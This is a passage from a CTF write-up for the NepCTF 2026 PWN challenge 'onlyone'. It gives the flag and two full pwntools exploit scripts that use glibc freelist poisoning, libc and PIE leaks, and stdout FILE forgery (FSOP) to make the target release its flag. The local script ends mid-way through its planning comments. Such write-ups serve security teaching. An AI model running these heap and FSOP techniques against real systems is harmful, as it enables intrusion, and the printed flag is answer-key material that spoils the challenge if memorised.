> 来源：https://github.com/fjh1997/nepctf2026-writeup/blob/main/writeup/WriteUp_%E5%AE%8C%E6%95%B4%E8%87%AA%E5%8C%85%E5%90%AB.md
> 以下为原始完整 writeup 中 #48 的连续章节摘录；代码未执行。

## #48 onlyone

### 1. 题目信息
- **题目名称**：onlyone
- **题目类型**：PWN
- **最终 Flag**：`NepCTF{cc389304-b6e8-4e61-3943-22aa91b09b96}`

### 2. 题目分析
onlyone：堆 freelist + FSOP 风；父进程管道要 `Nepnep`；seccomp 没 open，得绕着读 flag。

### 3. 解题思路
printf gift 漏 libc → COPY 漏 PIE → FSOP 控 stdout / 写 fd。远程记得开 SSL。

### 4. 解题过程
`python3 work/48/exp_remote.py remote HOST 443`。Flag：`NepCTF{cc389304-b6e8-4e61-3943-22aa91b09b96}`。本地 `exp_local.py` 用来稳链。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/48/exp_remote.py`
```python
#!/usr/bin/env python3
"""
NepCTF 2026 #48 onlyone — pure 6-slot remote exploit (no /proc/mem).

Offline PIE leak (no prior PIE needed)
  gift → libc
  freelist-alloc into libc COPY reloc slot that stores pie+0x5020
    (stdout@GLIBC R_X86_64_COPY: libc+0x202e20 holds pie+0x5020 after bind)
  freelist next-chain yields pie+0x5020 → show → PIE
  then freelist → slot table → retarget slot0 onto real _IO_2_1_stdout_
  FSOP on real FILE (vtable/mode already valid) + restore pie stdout COPY
  trigger → fflush → write(6,"Nepnep",6) → parent prints flag

Primitive budget
  - 6 adds, 2 pokes, 1 show, 1 trigger

Usage:
  python3 exp_remote.py                          # local
  python3 exp_remote.py HOST PORT
  python3 exp_remote.py remote HOST PORT
  python3 exp_remote.py 'ncat --ssl HOST PORT'
  # optional override (legacy): PIE_HEX / ONLYONE_PIE
"""
from __future__ import annotations

from pwn import *
import os
import re
import sys
import time

context.arch = "amd64"
context.log_level = "info"

CWD = "/home/catcatyu/nepctf/work/48"
LIBC_PATH = f"{CWD}/extracted/src/libc.so.6"
BIN = f"{CWD}/local/pwn"
HOOK = f"{CWD}/local/hook.so"

# BSS (PIE-relative)
OFF_STDOUT = 0x5020
OFF_SLOT0 = 0x5060

# glibc 2.39-0ubuntu8.7 (challenge libc == host): after dynamic bind,
# the COPY reloc storage for stdout points at pie+0x5020.
# Observed at libc+0x202e20 (same for stdin/stderr at +0x202f40 / +0x202e90).
OFF_STDOUT_COPY_PTR = 0x202E20

libc = ELF(LIBC_PATH, checksec=False)


def menu(io, c):
    io.sendlineafter(b"> ", str(c).encode())


def add(io, i):
    menu(io, 1)
    io.sendlineafter(b"idx: ", str(i).encode())
    io.recvuntil(b"done")


def write_slot(io, i, data):
    data = data.ljust(0x30, b"\x00")[:0x30]
    menu(io, 2)
    io.sendlineafter(b"idx: ", str(i).encode())
    io.sendafter(b"input: ", data)
    io.recvuntil(b"done")


def free_slot(io, i):
    menu(io, 3)
    io.sendlineafter(b"idx: ", str(i).encode())
    io.recvuntil(b"done")


def show(io, i):
    menu(io, 4)
    io.sendlineafter(b"idx: ", str(i).encode())
    return int(io.recvline().strip(), 16)


def poke(io, i, v):
    menu(io, 5)
    io.sendlineafter(b"idx: ", str(i).encode())
    io.sendlineafter(b"qword: ", str(v).encode())
    io.recvuntil(b"done")


def trigger(io, i=0, data=b"xx\n"):
    menu(io, 6)
    io.sendlineafter(b"idx: ", str(i).encode())
    io.sendafter(b"data: ", data)


def find_child(ppid, timeout=2.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        for pid in os.listdir("/proc"):
            if not pid.isdigit():
                continue
            try:
                with open(f"/proc/{pid}/stat") as f:
                    if int(f.read().split()[3]) == ppid:
                        return int(pid)
            except Exception:
                pass
        time.sleep(0.02)
    return None


def pie_from_maps(pid):
    with open(f"/proc/{pid}/maps") as f:
        for line in f:
            if "pwn" in line and "r--p" in line:
                return int(line.split("-")[0], 16)
    return None


def parse_pie(s):
    if s is None:
        return None
    s = s.strip()
    if s.lower().startswith("0x"):
        return int(s, 16)
    return int(s, 16)


def open_target(argv):
    """
    Returns (io, pie_hint, mode)
      mode: 'local' | 'remote'
    pie_hint is optional override; None → leak offline.
    """
    env_pie = (
        parse_pie(os.environ.get("ONLYONE_PIE"))
        if os.environ.get("ONLYONE_PIE")
        else None
    )

    if not argv:
        return process(BIN, env={"LD_PRELOAD": HOOK}), env_pie, "local"

    if len(argv) >= 1 and ("ncat" in argv[0] or " " in argv[0]):
        cmd = argv[0]
        pie = parse_pie(argv[1]) if len(argv) > 1 else env_pie
        return process(cmd, shell=True), pie, "remote"

    if argv[0] in ("remote", "r"):
        host, port = argv[1], int(argv[2])
        pie = parse_pie(argv[3]) if len(argv) > 3 else env_pie
        return remote(host, port, ssl=True), pie, "remote"

    if len(argv) >= 2 and re.match(r"^[\w.\-]+$", argv[0]) and argv[1].isdigit():
        host, port = argv[0], int(argv[1])
        pie = parse_pie(argv[2]) if len(argv) > 2 else env_pie
        return remote(host, port, ssl=True), pie, "remote"

    log.error(f"bad args: {argv}")
    raise SystemExit(1)


def leak_pie_via_copy(io):
    """
    freelist → libc COPY(stdout) storage → next = pie+0x5020 → show.
    Consumes: add0, free0, poke0, add1, add2, add3, show3.
    Returns pie base. Leaves slots 1,2,3 live; freelist empty.
    """
    copy_slot = libc.address + OFF_STDOUT_COPY_PTR
    log.info(f"COPY(stdout) ptr @ {hex(copy_slot)}")

    add(io, 0)
    free_slot(io, 0)
    poke(io, 0, copy_slot)
    add(io, 1)  # recover chunk0
    add(io, 2)  # alloc at copy_slot; freelist head ← *(copy_slot)=pie+0x5020
    add(io, 3)  # alloc pie+0x5020
    pie_stdout = show(io, 3)
    pie = pie_stdout - OFF_STDOUT
    log.success(f"leaked pie+0x5020 = {hex(pie_stdout)} → pie @ {hex(pie)}")
    return pie


def build_and_hijack(io, pie=None):
    io.recvuntil(b"gift: ")
    printf = int(io.recvline().strip(), 16)  # banner: "give you a gift: 0x..."
    libc.address = printf - libc.sym["printf"]
    file_obj = libc.sym["_IO_2_1_stdout_"]
    stdin_obj = libc.sym["_IO_2_1_stdin_"]
    stderr_obj = libc.sym["_IO_2_1_stderr_"]
    log.info(f"libc @ {hex(libc.address)}")
    log.info(f"_IO_2_1_stdout_ @ {hex(file_obj)}")

    if pie is None:
        pie = leak_pie_via_copy(io)
        # slots: 1=chunk0, 2=copy_slot, 3=pie+0x5020; freelist empty; 1 poke left
        # freelist → slot table
        free_slot(io, 1)
        poke(io, 1, pie + OFF_SLOT0)
        add(io, 4)  # recover
        add(io, 5)  # slot table
    else:
        # legacy path: known pie, FILE body on heap (needs heap show + more setup)
        log.info(f"using provided pie @ {hex(pie)}")
        for i in range(4):
            add(io, i)
        U0 = show(io, 0)
        F = U0
        log.info(f"F=U0 @ {hex(F)}")
        flags = 0xFBAD0000 | 0x800 | 0x1000 | 0x8000
        nep = F + 0x08
        c0 = p64(flags) + b"Nepnep\x00\x00" + p64(0) * 2 + p64(nep) + p64(nep + 6)
        write_slot(io, 0, c0)
        write_slot(io, 1, b"\x00" * 0x30)
        write_slot(io, 2, p64(0) + p64(F + 0x18) + p64(0) * 4)
        c3 = bytearray(0x30)
        c3[0:4] = p32(0)
        c3[0x18:0x20] = p64(libc.sym["_IO_file_jumps"])
        write_slot(io, 3, bytes(c3))
        free_slot(io, 1)
        poke(io, 1, pie + OFF_SLOT0)
        add(io, 4)
        add(io, 5)
        write_slot(io, 5, p64(F + 0x70) + p32(1) + p32(1) + p32(0) + p32(0))
        write_slot(io, 0, p32(6) + b"\x00" * 0x2C)
        free_slot(io, 5)
        poke(io, 5, pie + OFF_STDOUT)
        write_slot(io, 0, p64(F))
        trigger(io, 2, b"xx\n")
        return _recv_flag(io)

    # --- FSOP on real stdout FILE (vtable/mode already correct) ---
    # retarget slot0 → FILE
    write_slot(io, 5, p64(file_obj) + p32(1) + p32(1) + p32(0) + p32(0))

    flags = 0xFBAD0000 | 0x800 | 0x1000 | 0x8000  # PUTTING|IS_APPENDING|USER_LOCK
    nep = file_obj + 0x08
    c0 = p64(flags) + b"Nepnep\x00\x00" + p64(0) * 2 + p64(nep) + p64(nep + 6)
    write_slot(io, 0, c0)

    # fileno@FILE+0x70 (malloc-header-style hole relative to 0x30 user chunk
    # is not needed — we retarget slot0 to the hole directly)
    write_slot(io, 5, p64(file_obj + 0x70) + p32(1) + p32(1) + p32(0) + p32(0))
    write_slot(io, 0, p32(6) + b"\x00" * 0x2C)

    # slot3 still points at pie+0x5020 (stdout COPY). Restore FILE*s so
    # fflush(stdout) uses our patched FILE (same address as real stdout).
    # Layout: stdout@+0, pad, stdin@+0x10, pad, stderr@+0x20
    restore = (
        p64(file_obj)
        + p64(0)
        + p64(stdin_obj)
        + p64(0)
        + p64(stderr_obj)
        + p64(0)
    )
    write_slot(io, 3, restore)
    log.info(f"FSOP on real FILE @ {hex(file_obj)}; pie COPY restored")

    # slot4 is a normal live heap chunk (safe printf arg)
    trigger(io, 4, b"xx\n")
    return _recv_flag(io)


def _recv_flag(io):
    time.sleep(0.5)
    try:
        data = io.recvall(timeout=3)
    except Exception:
        data = b""
    log.info(f"recv: {data!r}")

    text = data.decode(errors="ignore")
    m = re.search(r"(NepCTF\{[^\}]+\}|flag\{[^\}]+\})", text)
    if m:
        s = m.group(1)
        log.success(f"FLAG: {s}")
        return s
    return None


def main():
    argv = sys.argv[1:]
    io, pie, mode = open_target(argv)

    # pie hint is optional now; offline leak is default.
    # local can still use maps if ONLYONE_USE_MAPS=1
    if pie is None and mode == "local" and os.environ.get("ONLYONE_USE_MAPS"):
        cpid = find_child(io.pid)
        if cpid is None:
            log.error("local: cannot find child pid for maps")
            io.close()
            raise SystemExit(1)
        pie = pie_from_maps(cpid)
        if pie is None:
            log.error("local: cannot parse pie from maps")
            io.close()
            raise SystemExit(1)
        log.info(f"local pie from maps pid={cpid}")

    try:
        flag = build_and_hijack(io, pie)
    finally:
        try:
            io.close()
        except Exception:
            pass

    if flag:
        print("FLAG", flag)
        return 0
    log.failure("no flag")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
```

#### `work/48/exp/exp_local.py`
```python
#!/usr/bin/env python3
"""
onlyone local exploit (known pie via /proc).

Plan:
1. libc from gift (printf)
2. heap from show
3. pie from /proc (local only; remote needs leak)
4. Build fake FILE F on heap at U0 covering:
   - flags (USER_LOCK|write path)
   - write_base / write_ptr with "Nepnep"
   - fileno = 6 (notify pipe write end)
   - vtable = _IO_file_jumps
5. freelist tcache-style arb write to pie+0x5020 (stdout var) → F
6. trigger → printf + fflush(F) → write("Nepnep") to fd 6 → parent prints flag
"""
from pwn import *
import os, time

context.arch = 'amd64'
context.log_level = 'info'
cwd = '/home/catcatyu/nepctf/work/48/local'
os.chdir(cwd)

elf = ELF('./pwn', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

def get_child(ppid):
    for _ in range(50):
        for pid in os.listdir('/proc'):
            if not pid.isdigit():
                continue
            try:
                with open(f'/proc/{pid}/stat') as f:
                    if int(f.read().split()[3]) == ppid:
                        return int(pid)
            except Exception:
                pass
        time.sleep(0.02)
    return None

def menu(io, c):
    io.sendlineafter(b'> ', str(c).encode())

def add(io, idx):
    menu(io, 1)
    io.sendlineafter(b'idx: ', str(idx).encode())
    io.recvuntil(b'done')

def write_slot(io, idx, data):
    assert len(data) <= 0x30
    menu(io, 2)
    io.sendlineafter(b'idx: ', str(idx).encode())
    io.sendafter(b'input: ', data.ljust(0x30, b'\x00')[:0x30])
    io.recvuntil(b'done')

def free_slot(io, idx):
    menu(io, 3)
    io.sendlineafter(b'idx: ', str(idx).encode())
    io.recvuntil(b'done')

def show(io, idx):
    menu(io, 4)
    io.sendlineafter(b'idx: ', str(idx).encode())
    return int(io.recvline().strip(), 16)

def poke(io, idx, val):
    menu(io, 5)
    io.sendlineafter(b'idx: ', str(idx).encode())
    io.sendlineafter(b'qword: ', str(val).encode())
    io.recvuntil(b'done')

def trigger(io, idx, data=b'xx'):
    menu(io, 6)
    io.sendlineafter(b'idx: ', str(idx).encode())
    io.sendafter(b'data: ', data)

def main():
    io = process('./pwn', env={'LD_PRELOAD': os.path.join(cwd, 'hook.so')})
    io.recvuntil(b'gift: ')
    printf = int(io.recvline().strip(), 16)
    libc.address = printf - libc.sym['printf']
    log.info(f'libc {hex(libc.address)} printf {hex(printf)}')

    cpid = get_child(io.pid)
    with open(f'/proc/{cpid}/maps') as f:
        maps = f.read()
    pie = int([l for l in maps.splitlines() if 'pwn' in l and 'r--p' in l][0].split('-')[0], 16)
    log.info(f'pie {hex(pie)} child {cpid}')

    stdout_var = pie + 0x5020
    file_jumps = libc.sym['_IO_file_jumps']
    S = libc.sym['_IO_2_1_stdout_']
    log.info(f'stdout_var {hex(stdout_var)} FILE {hex(S)} jumps {hex(file_jumps)}')

    # Layout F = U0 (chunk0)
    # Fields needed (USER_LOCK skips lock):
    # 0x00 flags, 0x20 write_base, 0x28 write_ptr, 0x70 fileno, 0xd8 vtable
    # With F=U0:
    #  flags, write_base, write_ptr in chunk0 [0,0x30)
    #  fileno at 0x70 - HOLE (chunk header between 0x30-0x40 and gap)
    #  vtable at 0xd8 in chunk3 [0xc0,0xf0)
    #
    # Strategy with F=0x28:
    #  flags @0x28 c0, write_base@0x48 c1, write_ptr@0x50 c1, fileno@0x98 c2, vtable@0x100 c4
    # Need chunks 0,1,2,3,4 allocated (5), then freelist for stdout_var.
    # freelist: free one victim, poke stdout_var, add recover + add target = need 2 free indices
    # Total indices: 5 + 2 = 7 > 6. FAIL for this layout.
    #
    # Strategy with 1 arb for fileno hole:
    # F=U0, chunks 0,1,2,3 for body+vtable, free V, poke fileno addr, recover+get
    # Then free another, poke stdout_var - no free indices.
    #
    # Overlapping pre-chain:
    # add 0,1,2,3  (F=U0: flags/write in 0, vtable in 3; fileno hole at 0x70)
    # Write into chunk1 at offset that will be the freelist node at U0+0x70:
    #   Actually U0+0x70 is NOT in any user region - it's in the malloc header of chunk2!
    #   chunk1 user: U0+0x40..U0+0x70
    #   chunk2 header: U0+0x70 size field at U0+0x78, user at U0+0x80
    #
    # T1 = U0+0x70: the freelist alloc returns U0+0x70 as "user pointer"
    # Writing 0x30 at U0+0x70 covers fileno at F+0x70=U0+0x70. Perfect.
    #
    # Prewrite chain for double pop with 1 free:
    # freelist head after free(V): V
    # *V = T1 (poke), *T1 = stdout_var (prewritten in some chunk that covers T1)
    # But T1=U0+0x70 is NOT in a user chunk - can't prewrite *T1 before alloc!
    #
    # Use T1 = U0+0x60 which IS in chunk1 [0x40,0x70):
    # arb region [0x60, 0x90) covers:
    #   fileno at 0x70 YES
    #   also overwrites into chunk2 header/user
    #
    # Prewrite at U0+0x60: p64(stdout_var) as next freelist
    # free V=chunk1? That corrupts U0+0x40.
    # free V=chunk2 (U0+0x80): freelist=U0+0x80, poke to U0+0x60
    #   * (U0+0x60) should be stdout_var (prewritten via write chunk1)
    # add4 gets U0+0x80 (restore)
    # add5 gets U0+0x60 - write fileno there
    # freelist now = stdout_var from *T1
    # NO free index for stdout_var!!! Still need one more add.
    #
    # Full index plan for double arb via chain:
    # indices 0,1,2,3 for FILE (4 chunks)
    # free 3 (V), poke T1, add 4 (recover V), add 5 (get T1)
    # After add5 freelist = stdout_var. NO more indices.
    #
    # Unless V is NOT one of the FILE permanent slots - we don't restore V
    # and use the "recover" slot for T1 instead:
    # free V, poke T1 (where *T1=stdout_var prewritten)
    # add A: gets V (discard content / or V is padding)
    # freelist = T1
    # add B: gets T1, write fileno, but writing at T1 also...
    # freelist = stdout_var after add B
    # Still need add C for stdout_var.
    # Indices: FILE(0,1,2) + V(3) + A(4) + B(5) = 6, no C.
    #
    # CHAIN 3 deep: free V, *V=T1, *T1=stdout_var
    # add A: V
    # add B: T1 (write fileno)
    # add C: stdout_var
    # Need 3 adds after free = 3 free indices + V + FILE.
    # FILE=2, V=1, A,B,C=3 → 6. EXACTLY if FILE only needs 2 chunks + T1 arb!
    #
    # Need: 2 heap chunks + T1 arb covering all crit fields.

    # Search done earlier: F=-0x70 with T1 near -0x70 for 2 chunks - negative F means before U0.
    # Try F=0 with T1 covering 0x70 and 0xd8? T1 is only 0x30 bytes - can't cover both 0x70 and 0xd8 (distance 0x68).

    # F=0, holes: fileno@0x70 and maybe vtable@0xd8 if only 2 chunks.
    # 2 chunks cover [0,0x30)+[0x40,0x70). Covers flags, write_*. Not fileno, not vtable.
    # One T1 of 0x30 can't cover 0x70 and 0xd8 (span 0x68+8 > 0x30).

    # F=0x28, 3 chunks [0,0x30)[0x40,0x70)[0x80,0xb0):
    # flags@0x28, write@0x48/0x50, fileno@0x98, vtable@0x100 HOLE
    # T1 covering 0x100: need T1 in [0xd1, 0x100] for vtable alone.
    # With 3 FILE chunks (indices 0,1,2), V=3, A=4, B=5:
    # free 3, poke T1=0x100 area, add4 gets 3, add5 gets T1 write vtable
    # freelist empty (unless prechained). For stdout need another chain.

    # PRECHAIN: *T1 = stdout_var before allocating T1
    # T1 must be prewritable. T1=U0+0x100 is chunk4 user if we allocate chunk4.
    # That would be FILE chunk.
    #
    # T1 = U0+0xf0? Not in user.
    # T1 = U0+0xc0 (chunk3 start): arb covers [0xc0, 0xf0). vtable@0x100 NOT covered.
    # T1 = U0+0xd8: need prewrite at 0xd8 - is it in a chunk?
    # With 4 chunks, chunk3 [0xc0,0xf0), 0xd8 is in chunk3!
    # Prewrite * (U0+0xd8) = stdout_var via write to chunk3 offset 0x18.
    # But then freelist to U0+0xd8 and write vtable OVERWRITES the freelist next pointer before pop...
    # Order:
    # 1. prewrite at U0+0xd8: stdout_var (as "next")
    # 2. free V, poke U0+0xd8
    # 3. add A: get V. freelist head = U0+0xd8 (from *V after poke... wait)
    #    After free V: freelist=V, *V=old_head(=0)
    #    poke V: *V = U0+0xd8
    #    freelist head still V
    # 4. add A: get V, freelist = *V = U0+0xd8
    # 5. add B: get U0+0xd8, freelist = *(U0+0xd8) = stdout_var (prewritten!)
    # 6. write vtable at B (U0+0xd8) - THIS OVERWRITES freelist already consumed, OK
    # 7. Need add C: get stdout_var. Need free index!
    #
    # Indices: FILE chunks that stay live: 0,1,2 (and maybe 3 if T1 is in 3 and we use 3 as live)
    # If T1 is in chunk3, chunk3 must be live for prewrite, then we also freelist-alloc T1 which is INSIDE chunk3 - overlapping!
    # add B returns ptr=U0+0xd8, which is inside chunk3's user area. Two slots point into same region. OK.
    #
    # Live FILE: 0,1,2,3 (4 chunks, 3 has vtable region)
    # V must be separate: use free(4) after add 0..4
    # Indices 0,1,2,3,4 = 5, need A and B and C = 3 more → 8. Too many.
    #
    # Reduce: V is chunk3 itself (vtable host):
    # free(3) corrupts *chunk3 = freelist fd at U0+0xc0
    # poke(3, U0+0xd8) - *chunk3 = U0+0xd8, but U0+0xd8 is WITHIN chunk3 (offset 0x18)!
    # freelist head = chunk3 = U0+0xc0
    # * (U0+0xc0) = U0+0xd8
    # Need *(U0+0xd8) = stdout_var prewritten - but free already wrote 8 bytes at 0xc0, poke wrote U0+0xd8 at 0xc0.
    # Prewrite stdout_var at 0xd8 BEFORE free.
    # add A: gets U0+0xc0, freelist=U0+0xd8
    # add B: gets U0+0xd8, freelist=stdout_var
    # write vtable at B
    # add C: gets stdout_var, write F
    # Indices: 0,1,2 FILE + 3=V + A + B + C = 7. Still over by 1.
    #
    # FILE only 0,1 for flags/write, fileno via T1, vtable via T1 if same 0x30 covers both?
    # fileno@0x70, vtable@0xd8, distance 0x68 > 0x30. No.
    #
    # --- USE REAL stdout FILE body (S) and only hijack pointer ---
    # Real S already has valid flags, fileno=1, vtable, lock, everything.
    # If we set write_base/write_ptr on S to point to Nepnep buffer, and fileno=6,
    # fflush would write Nepnep to fd 6.
    # But write_base at S+0x20 is in forbidden freelist zone [S-0x100, S+0xd8).
    #
    # Writable from freelist: addresses outside that zone.
    # S+0xd8 is allowed (boundary: check is start < S+0xd8, so start=S+0xd8 is OK).
    # We can write 0x30 at S+0xd8 covering vtable + the following libc data including stdout ptr at S+0xe8.
    #
    # Wait: stdout GOT in libc points to pie+0x5020, not to libc's stdout data at 0x2046a8.
    # Writing libc 0x2046a8 does NOT affect fflush! Must write pie+0x5020.
    #
    # S+0xd8 write covers libc addresses near S, not pie.
    #
    # --- Final workable local plan with pie known ---
    # Use 2 pokes: poke1 for FILE hole, poke2 for pie+0x5020
    # Maximize FILE in normal chunks.
    #
    # F = U0 + 0x28
    # chunks 0,1,2,4 (need 5 mallocs for offset 0x100):
    #   malloc order: m0=U0, m1=U0+40, m2=U0+80, m3=U0+c0, m4=U0+100
    #   F=0x28: flags m0, write m1, fileno m2, vtable m4. m3 padding.
    # Indices 0-4 for these, free 5? only 0-5. free(3) as V for poke to pie+0x5020:
    # free(3); poke(3, pie+0x5020); add(5) gets m3; --- freelist = pie+0x5020, need another add - NO INDEX.
    #
    # Skip recover: free(3); poke(3, pie+0x5020); add(5) gets m3 (padding restored/discarded);
    # freelist still has pie+0x5020 as NEXT only after first pop:
    # free: freelist=m3, *m3=0
    # poke: *m3=pie+0x5020
    # add5: gets m3, freelist=*m3=pie+0x5020
    # NO index left for pie+0x5020.
    #
    # Use the FACT that we don't need to keep m3:
    # What if freelist head after poke is already the target without intermediate?
    # poke writes into freed chunk, freelist head still points to freed chunk.
    # First add always gets the freed chunk first.
    #
    # UNLESS we can poke the freelist HEAD pointer at 0x5100 directly!
    # freelist global at pie+0x5100. If we freelist-allocate to pie+0x5100... need pie.
    # With pie: free V, poke pie+0x5100, add gets V, add gets pie+0x5100, write stdout_var as head!
    # Then add gets stdout_var. That's 2 arbs effectively with chaining.
    #
    # free V; poke(V, pie+0x5100); add A: V; add B: pie+0x5100; write_slot(B, p64(pie+0x5020));
    # freelist head is now pie+0x5020! add C: pie+0x5020; write F.
    # Indices: FILE + V + A + B + C.
    # If FILE=3 (0,1,2), V=3, A=4, B=5 → 6, no C.
    # If FILE=2, V=2?, A,B,C → 5. FILE=2 must cover all fields.

    # Can FILE=3 with V being one of FILE, and freelist head poke:
    # free(2); poke pie+0x5100; add3: gets2; add4: pie+0x5100 write p64(pie+0x5020); add5: pie+0x5020 write F
    # FILE live: 0,1 and after add3 slot2 restored. Total indices 0,1,2,3,4,5 = 6.
    # FILE fields in 0,1,2 only - 3 chunks. Need all crit in 3 chunks. Earlier search said NO for complete FILE.

    # With USER_LOCK + F special:
    log.info('Trying practical sequence...')

    # REVISED: Use F = chunk content as IO_FILE at U0, and only set fields we can.
    # mode=0 and write_ptr>write_base is enough for _IO_do_write path if mode<=0.
    # From file_sync: if write_ptr > write_base and mode<=0: call _IO_do_write.
    # _IO_do_write uses fileno.

    # Let me just try F at U0 with holes zero-filled from memset of malloc,
    # and see what happens if fileno=0 (stdin) - would write Nepnep to stdin pipe, not useful.
    # Uninitialized fileno from memset is 0.

    # Heap chunks from malloc are zeroed? The program memset(0x30) only when freelist empty (fresh malloc path). Yes!

    # For F=U0 with only chunks 0 and 3:
    # write chunk0: flags, nepnep, write_base, write_ptr
    # write chunk3: mode=0, vtable
    # fileno=0 from zero - WRONG

    # freelist arb to set fileno at U0+0x70 AND stdout:
    # Use freelist head global manipulation with pie:

    # Sequence (pie known):
    # 1. add 0,1,2,3  -- 0:flags/write, 1:pad/lock?, 2:pad, 3:vtable/mode
    #    Actually for F=U0: vtable at 0xd8 needs chunk3. fileno hole at 0x70.
    # 2. write FILE body (fileno left 0 for now)
    # 3. free(1)  -- V, burns slot1
    # 4. poke(1, U0+0x70)  -- will get fileno hole
    # 5. add(4) gets chunk1 back; freelist = U0+0x70
    # 6. add(5) gets U0+0x70; write fileno=6
    #    freelist empty. slots: 0,2,3 live FILE; 1 stale; 4=old1; 5=fileno region
    # NO room for stdout!

    # freelist head trick:
    # 3. free(1)
    # 4. poke(1, pie+0x5100)  -- freelist node points to freelist head storage
    # 5. add(4) gets chunk1; freelist = pie+0x5100
    # 6. add(5) gets pie+0x5100; write p64(pie+0x5020) into freelist head!
    #    Now freelist head = pie+0x5020. But no more indices for add!

    # After step 6, freelist head is pie+0x5020. If we free another live slot:
    # free(2): *chunk2 = freelist_head = pie+0x5020; freelist_head = chunk2
    # This PUSHES onto freelist, head=chunk2, *chunk2=pie+0x5020
    # Then we need add to pop chunk2 then pie+0x5020 - need 2 indices, all burned.

    # free(2) after step 6: head=chunk2 -> pie+0x5020
    # We have stale:1, live:0,2,3,4,5. free(2) makes 2 freed (busy=0).
    # poke already used twice? We only used 1 poke so far. poke limit is 2 (poke_used > 1 fails, so 2 pokes OK).
    # Don't need second poke.
    # Need 2 free indices to pop - we have NONE (all 0-5 allocated flag set).

    # CRITICAL RE-READ of stale check:
    # add requires NOT (allocated && freed). After free, allocated is still 1, freed is 1 → stale.
    # allocated is set on add, never cleared on free.
    # So once an index is used for add, it can never be used for add again after free.
    # Maximum 6 successful adds ever.

    # Count adds in freelist head trick:
    # add0,1,2,3 (FILE) = 4
    # free1, poke, add4 (recover), add5 (freelist head) = 2 more, total 6
    # freelist head now written to pie+0x5020. Can't add anymore!

    # After writing freelist head to pie+0x5020 without consuming it:
    # We write_slot(5, p64(pie+0x5020)) where slot5 points to pie+0x5100.
    # freelist global is AT pie+0x5100. When we allocated it, we did:
    #   ptr = freelist_head (=pie+0x5100); freelist_head = *ptr;
    # So we READ the old freelist head value from pie+0x5100 and set freelist to that.
    # Then write_slot writes pie+0x5020 TO pie+0x5100. That SETS freelist head storage to pie+0x5020.
    # But the in-memory freelist variable was already updated to old *ptr!
    # The program uses a global variable at 0x5100. When we write to 0x5100 via write_slot,
    # we ARE writing the freelist head! Next add will use it!

    # VERIFY add code:
    # freelist_head = *(0x5100)
    # if freelist_head: ptr = freelist_head; freelist_head = *ptr; // updates 0x5100
    # So 0x5100 IS the freelist head. When we have a slot pointing to 0x5100 and write to it,
    # we change freelist head for the NEXT add.

    # Sequence:
    # free V; poke V to pie+0x5100
    # add A: gets V; freelist_head = *V = pie+0x5100 (set by poke into V which is not 0x5100)
    # Wait: poke writes to V's memory (*V = pie+0x5100). freelist_head still = V.
    # add A: ptr = V; freelist_head = *V = pie+0x5100. Yes.
    # add B: ptr = pie+0x5100; freelist_head = *(pie+0x5100) = old value (probably 0)
    # write B: write p64(pie+0x5020) to pie+0x5100 → freelist_head = pie+0x5020
    # add C: ptr = pie+0x5020; freelist_head = *stdout_var (= current FILE* S)
    # write C: write p64(F) to pie+0x5020 → stdout = F

    # Adds: FILE(n) + A + B + C = n+3 ≤ 6 → n ≤ 3.
    # free burns V which must be one of the n FILE or extra.
    # If V is one of FILE (n=3), adds = 3 (including V) + A + B + C = 6. Perfect!
    # V is freed then A recovers it. Net FILE live: 3.

    # Can we fit complete FILE in 3 chunks? Earlier: NO for all 5 crit fields.
    # With F=U0: flags,write in c0; vtable in c3 - but only 3 chunks 0,1,2 means vtable at 0xd8 not covered (0xd8 > 0xb0).
    # chunks 0,1,2 cover up to 0xb0. vtable 0xd8 out. fileno 0x70 out.

    # n=3 with T1=fileno via the freelist-to-0x5100 not helping fileno.

    # Combine: use write to pie+0x5100 chain AND one of A,B,C is the fileno hole?
    # free V; poke T_fileno; add A gets V; add B gets fileno hole write fileno=6;
    #   freelist empty. Need separate for stdout.

    # free V; poke pie+0x5100; add A gets V; add B gets 0x5100;
    # write B as p64(U0+0x70)  # freelist → fileno hole first
    # Then we need another write to chain fileno → stdout...
    # After add B, freelist=0. write B sets freelist=U0+0x70.
    # add C: gets fileno hole, freelist=*fileno_hole.
    # We prewrite *fileno_hole = pie+0x5020. But fileno hole U0+0x70 is not prewritable (not in user chunk)!

    # freelist head write value = pie+0x5020 directly (skip fileno):
    # Need fileno without arb - use F where fileno lands in a chunk.

    # F=0x28, 3 chunks cover flags, write, fileno; vtable hole at 0x100
    # n=3 chunks 0,1,2 with malloc offsets 0,40,80. vtable at 0x100 needs m4.
    # Without m3,m4: only 3 mallocs cover to 0xb0. vtable at 0x100 uncovered.

    # F=0x28 with 5 mallocs (0-4), V=one of them:
    # n=5 + A + B + C = 8 > 6. Fail.

    # What if freelist head trick only needs A,B (write head to target) and target is obtained by the write itself without add C?
    # write to pie+0x5020 directly via freelist alloc of pie+0x5020:
    # free V; poke pie+0x5020; add A gets V; add B gets pie+0x5020; write F.
    # Adds: FILE + A + B. If V in FILE: FILE + A + B = n + 2 ≤ 6, n ≤ 4.
    # Need complete FILE in 4 chunks. Earlier search: complete no-lock FILE needs 5 chunks for F=0x28.
    # For F=0 with 4 chunks: fileno@0x70 hole, vtable@0xd8 in chunk3. Still 1 hole.
    # n=4 with V in FILE: adds = 4 + A + B = 6. Can fill 1 hole with... no room for hole arb.

    # n=3 FILE + hole as B + stdout needs more.
    # free V; poke hole; add A: V; add B: hole; (1 poke)
    # free V2; poke stdout; - V2 and need A2,B2 - not enough.

    # n=3 FILE (with all fields!), V is FILE, free V, poke stdout, add A, add B write F
    # V restored as A. n=3 + A + B = 5 ≤ 6. Works if 3 chunks complete FILE!

    # Is there ANY F where 3 consecutive chunks cover flags, write_base, write_ptr, fileno, vtable?
    # span of fields: vtable - flags = 0xd8. 3 chunks span 0xb0 of user space with gaps.
    # User coverage length max continuous-ish: 0x30*3=0x90 < 0xd8+8.
    # Can non-overlapping fields fit in the 0x90 capacity with gaps matching 0x10 holes?
    # flags at F, vtable at F+0xd8. Both need to be in user regions of 3 chunks.
    # chunk positions relative: 0, 0x40, 0x80 with size 0x30.
    # F+0 and F+0xd8 both in union of these.
    # F in [0,0x30) U [0x40,0x70) U [0x80,0xb0)
    # F+0xd8 in same.
    # F+0xd8 - F = 0xd8 = 216.
    # Possible pairs of regions distance: 0, 0x40, 0x80.
    # 0xd8 is not equal to 0, 0x40, or 0x80.
